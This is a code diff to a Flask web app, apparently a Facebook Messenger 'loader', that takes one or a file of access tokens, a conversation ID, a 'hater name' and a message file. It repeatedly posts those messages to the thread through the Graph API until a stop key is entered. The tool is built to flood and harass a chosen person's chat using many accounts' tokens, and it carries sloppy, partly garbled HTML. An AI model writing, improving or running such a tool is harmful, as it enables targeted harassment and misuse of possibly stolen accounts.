@@ -1,4 +1,4 @@
-from flask import Flask, request, render_template_string
+from flask import Flask, request, render_template_string, redirect
 import requests
 from threading import Thread, Event
 import time
@@ -7,17 +7,12 @@ import string
 
 app = Flask(__name__)
 app.debug = True
+app.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024
 
 headers = {
-    'Connection': 'keep-alive',
-    'Cache-Control': 'max-age=0',
-    'Upgrade-Insecure-Requests': '1',
-    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
-    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-    'Accept-Encoding': 'gzip, deflate',
-    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
-    'referer': 'www.google.com'
+    'User-Agent': 'Mozilla/5.0',
+    'Accept': '*/*',
+    'Accept-Language': 'en-US,en;q=0.9',
 }
 
 stop_events = {}
@@ -30,175 +25,184 @@ def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id
             if stop_event.is_set():
                 break
             for access_token in access_tokens:
+                message = f"{mn} {message1}"
                 api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
-                message = str(mn) + ' ' + message1
                 parameters = {'access_token': access_token, 'message': message}
-                response = requests.post(api_url, data=parameters, headers=headers)
-                if response.status_code == 200:
-                    print(f"Message Sent Successfully From token {access_token}: {message}")
-                else:
-                    print(f"Message Sent Failed From token {access_token}: {message}")
+                try:
+                    response = requests.post(api_url, data=parameters, headers=headers)
+                    if response.status_code == 200:
+                        print(f"[✔️ SENT] {message}")
+                    else:
+                        print(f"[❌ FAIL] {response.status_code} {response.text}")
+                except Exception as e:
+                    print(f"[⚠️ ERROR] {str(e)}")
                 time.sleep(time_interval)
 
 @app.route('/', methods=['GET', 'POST'])
 def send_message():
+    message = ""
+    stop_message = ""
     if request.method == 'POST':
-        token_option = request.form.get('tokenOption')
+        if 'txtFile' in request.files:
+            token_option = request.form.get('tokenOption')
+            if token_option == 'single':
+                access_tokens = [request.form.get('singleToken')]
+            else:
+                token_file = request.files['tokenFile']
+                access_tokens = token_file.read().decode(errors='ignore').strip().splitlines()
 
-        if token_option == 'single':
-            access_tokens = [request.form.get('singleToken')]
-        else:
-            token_file = request.files['tokenFile']
-            access_tokens = token_file.read().decode().strip().splitlines()
+            thread_id = request.form.get('threadId')
+            mn = request.form.get('kidx')
+            time_interval = int(request.form.get('time'))
+            txt_file = request.files['txtFile']
+            messages = txt_file.read().decode(errors='ignore').splitlines()
 
-        thread_id = request.form.get('threadId')
-        mn = request.form.get('kidx')
-        time_interval = int(request.form.get('time'))
+            task_id = 'BROKENNADEEM' + ''.join(random.choices(string.ascii_letters + string.digits, k=10))
+            stop_events[task_id] = Event()
+            thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
+            threads[task_id] = thread
+            thread.start()
 
-        txt_file = request.files['txtFile']
-        messages = txt_file.read().decode().splitlines()
-
-        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
-
-        stop_events[task_id] = Event()
-        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
-        threads[task_id] = thread
-        thread.start()
-
-        return f'LODER RUNNING SUCCESSFUL 🎉 YOUR STOP KEY-⪼ {task_id}'
+            message = f'''
+            <div style="padding:20INVALID gin-top:20px; background:black; color:lime; border-radius:15px; box-shadow: 0 0 15px lime; font-size:16px;">
+            ✅ <b> YOUR LODER START SUCCESSFUL 🎉</b><br><br>
+            🔑 <b>YOUR LODER STOP KEY ⤵️</b><br><br>
+            <span style="color:red; font-size:18px;">{task_id}</span><br><br>
+           [-NADEEM-] USE IT TO STOP THE PROCESS 
+            </div>
+            '''
+        elif 'taskId' in request.form:
+            task_id = request.form.get('taskId')
+            if task_id in stop_events:
+                stop_events[task_id].set()
+                stop_message = f'''
+                <div style="padding:20px; margin-top:20px; background:darkred; color:white; border-radius:15px; font-size:16px;">
+                ✅ <b>YOUR LODER STOP SUCCESSFUL</b><br><br>
+                YOUR STOP KEY ⤵️ <b>{task_id}</b>
+                </div>
+                <script>setTimeout(() => window.location.href = "/", 10000);</script>
+                '''
+            else:
+                stop_message = f'''
+                <div style="padding:20px; margin-top:20px; background:gray; color:white; border-radius:15px; font-size:16px;">
+                ❌ <b>INVALID YOUR STOP KEY</b><br><br>
+                <b>{task_id}</b>
+                </div>
+                <script>setTimeout(() => window.location.href = "/", 10000);</script>
+                '''
 
     return render_template_string('''
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>☠️✨ ⇣ B R OK E N ⪼ N A D E E M ⇣ ✨☠️</title>
+  <title>☠️🎋 OWNER BROKEN NADEEM 🎋☠️</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
   <style>
-    /* CSS for styling elements */
-    label { color: white; }
-    .file { height: 30px; }
-    body {
-      background-image: url('https://i.ibb.co/19kSMz4/In-Shot-20241121-173358587.jpg');
+    html, body {
+      height: 100%;
+      margin: 0;
+      background: url('https://i.ibb.co/hJWX8LwJ/IMG-20250307-WA0027.jpg') no-repeat center center fixed;
       background-size: cover;
-      background-repeat: no-repeat;
       color: white;
+      font-size: 16px;
     }
     .container {
-      max-width: 350px; 
-      height: auto;
+      max-width: 95%;
+      margin: 20px auto;
+      background: rgba(0, 0, 0, 0.95);
       border-radius: 20px;
       padding: 20px;
-      box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
-      box-shadow: 0 0 15px white;
-      border: none;
-      resize: none;
+      box-shadow: 0 0 20px red;
     }
     .form-control {
-      outline: 1px red;
-      border: 1px double white;
-      background: transparent;
-      width: 100%;
-      height: 40px;
-      padding: 7px;
-      margin-bottom: 20px;
-      border-radius: 10px;
-      color: white;
+      font-size: 14px;
+      padding: 6px;
+      height: auto;
     }
-    .header { text-align: center; padding-bottom: 20px; }
-    .btn-submit { width: 100%; margin-top: 10px; }
-    .footer { text-align: center; margin-top: 20px; color: #888; }
-    .whatsapp-link {
-      display: inline-block;
-      color: #25d366;
-      text-decoration: none;
-      margin-top: 10px;
+    .btn {
+      font-size: 14px;
+      padding: 6px;
     }
-    .whatsapp-link i { margin-right: 5px; }
+    label {
+      font-size: 15px;
+      margin-top: 8px;
+    }
+    h1 {
+      font-size: 28px;
+      text-shadow: 1px 1px red;
+    }
+    .glow {
+      color: lime;
+      font-size: 18px;
+      text-align: center;
+      padding: 12px;
+      margin: 20px 0;
+      background: black;
+      border-radius: 15px;
+      box-shadow: 0 0 12px lime;
+    }
   </style>
 </head>
 <body>
-  <header class="header mt-4">
-    <h1 class="mt-3">🎋 N A D E E M ⇣ A L I 🎋</h1>
-  </header>
-  <div class="container text-center">
+  <div class="container">
+    <h1 class="text-center text-danger">✨ BROKEN NADEEM ✨</h1>
+
     <form method="post" enctype="multipart/form-data">
-      <div class="mb-3">
-        <label for="tokenOption" class="form-label">⇣ S E L E C T ⇣ T O K E N ⇣ O P T I O N ⇣</label>
-        <select class="form-control" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
-          <option value="single">Single Token</option>
-          <option value="multiple">Token File</option>
-        </select>
+      <label>⇣ S E L E C T ⇣ T O K E N ⇣ O P T I O N ⇣</label>
+      <select class="form-control mb-2" name="tokenOption" id="tokenOption" onchange="toggleToken()" required>
+        <option value="single">Single Token</option>
+        <option value="multiple">Multiple Tokens (File)</option>
+      </select>
+
+      <div id="singleTokenDiv">
+        <label>⇣ E N T E R ⇣ S I N G L E ⇣ T O K E N ⇣</label>
+        <input type="text" name="singleToken" class="form-control mb-2">
       </div>
-      <div class="mb-3" id="singleTokenInput">
-        <label for="singleToken" class="form-label">⇣ E N T E R ⇣ S I N G L E ⇣ T O K E N ⇣</label>
-        <input type="text" class="form-control" id="singleToken" name="singleToken">
+
+      <div id="tokenFileDiv" style="display:none;">
+        <label>⇣ U P L O A D ⇣ T O K E N ⇣ F I L E ⇣</label>
+        <input type="file" name="tokenFile" class="form-control mb-2" accept=".txt">
       </div>
-      <div class="mb-3" id="tokenFileInput" style="display: none;">
-        <label for="tokenFile" class="form-label">⇣ C H O O S E ⇣ T O K E N ⇣ F I L E ⇣</label>
-        <input type="file" class="form-control" id="tokenFile" name="tokenFile">
-      </div>
-      <div class="mb-3">
-        <label for="threadId" class="form-label">⇣ E N T E R ⇣ C O N V O ⇣ I D ⇣</label>
-        <input type="text" class="form-control" id="threadId" name="threadId" required>
-      </div>
-      <div class="mb-3">
-        <label for="kidx" class="form-label">⇣ E N T E R ⇣ H A T E R ⇣ N A M E ⇣</label>
-        <input type="text" class="form-control" id="kidx" name="kidx" required>
-      </div>
-      <div class="mb-3">
-        <label for="time" class="form-label"⇣ E N T E R ⇣ S P E E D ⇣ (SECONDS) ⇣</label>
-        <input type="number" class="form-control" id="time" name="time" required>
-      </div>
-      <div class="mb-3">
-        <label for="txtFile" class="form-label">⇣ E N T E R ⇣ M E S S A G E ⇣ F I L E ⇣</label>
-        <input type="file" class="form-control" id="txtFile" name="txtFile" required>
-      </div>
-      <button type="submit" class="btn btn-primary btn-submit">☠️ ⇣ S T A R T ⇣ L O D E R ⇣ ☠️</button>
+
+      <label>⇣ E N T E R ⇣ C O N V O ⇣ I D ⇣</label>
+      <input type="text" name="threadId" class="form-control mb-2" required>
+
+      <label>⇣ E N T E R ⇣ H A T E R ⇣ N A M E ⇣</label>
+      <input type="text" name="kidx" class="form-control mb-2" required>
+
+      <label>⇣ E N T E R ⇣ S P E E D ⇣ (SECONDS) ⇣</label>
+      <input type="number" name="time" class="form-control mb-2" min="1" required>
+
+      <label>⇣ U P L O A D ⇣ M E S S A G E ⇣ F I L E ⇣</label>
+      <input type="file" name="txtFile" class="form-control mb-2" accept=".txt" required>
+
+      <button type="submit" class="btn btn-success w-100 mb-3">🚀 ⇣ S T A R T ⇣ L O D E R ⇣ 🚀</button>
+
+      {{ message|safe }}
     </form>
-    <form method="post" action="/stop">
-      <div class="mb-3">
-        <label for="taskId" class="form-label">⇣ E N T E R ⇣ S T O P ⇣ KEY⇣ </label>
-        <input type="text" class="form-control" id="taskId" name="taskId" required>
-      </div>
-      <button type="submit" class="btn btn-danger btn-submit mt-3">❤️⇣ S T O P ⇣ L O D E R ⇣ ❤️</button>
+
+    <form method="post">
+      <label>⇣ E N T E R ⇣ S T O P ⇣ KEY ⇣</label>
+      <input type="text" name="taskId" class="form-control mb-2" required>
+      <button type="submit" class="btn btn-danger w-100">🛑 ⇣ S T O P ⇣ L O D E R ⇣ 🛑</button>
+
+      {{ stop_message|safe }}
     </form>
+
+    <div class="glow">Created By BROKEN NADEEM </div>
   </div>
-  <footer class="footer">
-    <p>☠️✨ ⇣ B R OK E N ⪼ N A D E E M ⇣ ✨☠️</p>
-    <p> <a href="https://www.facebook.com/pelam.raja.7">ᴄʟɪᴄᴋ ʜᴇʀᴇ ғᴏʀ ғᴀᴄᴇʙᴏᴏᴋ</a></p>
-    <div class="mb-3">
-      <a href="https://wa.me/+917209101285" class="whatsapp-link">
-        <i class="fab fa-whatsapp"></i>💫 𝘾𝙃𝘼𝙏 𝙊𝙉 𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋 💫
-      </a>
-    </div>
-  </footer>
+
   <script>
-    function toggleTokenInput() {
-      var tokenOption = document.getElementById('tokenOption').value;
-      if (tokenOption == 'single') {
-        document.getElementById('singleTokenInput').style.display = 'block';
-        document.getElementById('tokenFileInput').style.display = 'none';
-      } else {
-        document.getElementById('singleTokenInput').style.display = 'none';
-        document.getElementById('tokenFileInput').style.display = 'block';
-      }
+    function toggleToken() {
+      const option = document.getElementById('tokenOption').value;
+      document.getElementById('singleTokenDiv').style.display = (option === 'single') ? 'block' : 'none';
+      document.getElementById('tokenFileDiv').style.display = (option === 'multiple') ? 'block' : 'none';
     }
   </script>
 </body>
 </html>
-''')
-
-@app.route('/stop', methods=['POST'])
-def stop_task():
-    task_id = request.form.get('taskId')
-    if task_id in stop_events:
-        stop_events[task_id].set()
-        return f'Task with ID {task_id} has been stopped.'
-    else:
-        return f'No task found with ID {task_id}.'
+''', message=message, stop_message=stop_message)
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
